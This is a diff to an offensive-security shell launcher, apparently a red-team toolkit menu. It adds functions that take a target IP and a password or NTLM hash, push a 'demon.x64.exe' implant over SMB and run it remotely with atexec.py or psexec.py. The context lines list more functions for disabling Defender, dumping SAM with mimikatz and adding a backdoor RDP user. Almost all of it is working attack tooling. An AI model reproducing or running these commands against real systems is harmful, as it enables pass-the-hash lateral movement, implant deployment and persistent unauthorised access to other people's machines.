@@ -29,7 +29,7 @@ function ctrl() {
 function_meta=("bye_bye_defender" "Stabilise_reverse_shell" "Stabilise_reverse_shell3" \
 	"vim_hexdump_ascii" "vim_hexdump_binary" "meterpreter_proxychain" \
 	"tmux_sinc_panes_on" "tmux_sinc_panes_off" "mimikatz_dump_sam" "activate_rdp" "backdoor_win" \
-	"powershell_find_txt" "powershell_find_ps1" "sharphound_exe_collect")
+	"powershell_find_txt" "powershell_find_ps1" "sharphound_exe_collect" "at_exec_ma_boy" "psexec_outa_here")
 
 # function that are needed
 function stabilize_rev_shell() {
@@ -111,6 +111,52 @@ function backdoor_win() {
 	command "net localgroup \"Remote Desktop Users\" backdoor /add"
 }
 
+function at_exec_ma_boy() {
+	form_data=$(zenity --forms --title="Enter Information" \
+	--text="Enter the following information:" \
+	--add-entry="IP Address" \
+	--add-entry="Username" \
+	--add-combo="Authentication Type" --combo-values="Password|Hash" \
+	--separator="|")
+	ip_address=$(echo "$form_data" | cut -d"|" -f1)
+	username=$(echo "$form_data" | cut -d"|" -f2)
+	auth_type=$(echo "$form_data" | cut -d"|" -f3)
+
+	password=$(zenity --password --title="enter $auth_type")
+
+	sleep 2
+	if [ $auth_type = "Hash" ]; then
+		command "echo -e \"use C\\$\nput $HOME/payload/demon.x64.exe\" | smbclient.py -debug -hashes $password '$username@$ip_address'"
+		sleep 1
+		command "atexec.py -debug -hashes $password '${username}@$ip_address' 'c:\\demon.x64.exe'"
+	else
+		command "echo -e \"use C\\$\nput $HOME/payload/demon.x64.exe\" | smbclient.py -debug -hashes '${username}:${password}@$ip_address'"
+		sleep 1
+		command "atexec.py -debug '${username}:${password}@$ip_address' 'c:\\demon.x64.exe'"
+	fi
+}
+
+function psexec_outa_here() {
+	form_data=$(zenity --forms --title="Enter Information" \
+	--text="Enter the following information:" \
+	--add-entry="IP Address" \
+	--add-entry="Username" \
+	--add-combo="Authentication Type" --combo-values="Password|Hash" \
+	--separator="|")
+	ip_address=$(echo "$form_data" | cut -d"|" -f1)
+	username=$(echo "$form_data" | cut -d"|" -f2)
+	auth_type=$(echo "$form_data" | cut -d"|" -f3)
+
+	password=$(zenity --password --title="enter $auth_type")
+
+	sleep 2
+	if [ $auth_type = "Hash" ]; then
+		command "psexec.py -c $HOME/payload/demon.x64.exe -hashes $password '${username}@$ip_address' './demon.x64.exe'"
+	else
+		command "psexec.py -c $HOME/payload/demon.x64.exe '${username}:${password}@$ip_address' './demon.x64.exe'"
+	fi
+}
+
 ret=$(echo ${function_meta[*]} | tr ' ' '\n' | dmenu "$@")
 
 
@@ -144,5 +190,9 @@ if [ ! -z $ret ]; then
 		powershell_find_ps1
 	elif [ $ret = "sharphound_exe_collect" ]; then
 		sharphound_exe_collect
+	elif [ $ret = "at_exec_ma_boy" ]; then
+		at_exec_ma_boy
+	elif [ $ret = "psexec_outa_here" ]; then
+		psexec_outa_here
 	fi
 fi
